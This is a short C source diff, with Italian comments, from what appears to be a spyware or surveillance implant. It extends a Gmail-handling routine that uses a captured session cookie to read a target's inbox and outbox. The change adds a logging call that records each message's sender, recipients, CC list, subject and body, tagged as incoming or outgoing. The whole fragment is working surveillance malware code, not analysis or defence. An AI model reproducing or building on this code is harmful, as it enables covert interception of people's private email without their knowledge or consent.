@@ -19,7 +19,7 @@ extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
 
 extern BOOL bPM_MailCapStarted; // variabili per vedere se gli agenti interessati sono attivi
 
-DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi, DWORD last_tstamp_lo)
+DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi, DWORD last_tstamp_lo, BOOL is_incoming)
 {
 	DWORD ret_val;
 	BYTE *r_buffer = NULL;
@@ -134,11 +134,7 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi,
 		*ptr_inner2 = 0;
 
 		CheckProcessStatus();
-
-		// A questo punto ho src_add, dest_add, cc_add, subject e il body (in ptr_inner)
-		// XXX Ricostruisco il MIME e scrivo il log
-		//MessageBox(NULL, ptr_inner, subject, MB_OK);	
-		// 
+		LogSocialMailMessage(MAIL_GMAIL, src_add, dest_add, cc_add, subject, ptr_inner, is_incoming);
 	
 		SAFE_FREE(r_buffer_inner);
 	}
@@ -188,6 +184,6 @@ DWORD HandleGMail(char *cookie)
 
 	last_tstamp_lo = GetLastFBTstamp(ik_val, &last_tstamp_hi);
 
-	ParseMailBox(GM_OUTBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo);
-	return ParseMailBox(GM_INBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo);
+	ParseMailBox(GM_OUTBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, FALSE);
+	return ParseMailBox(GM_INBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, TRUE);
 }
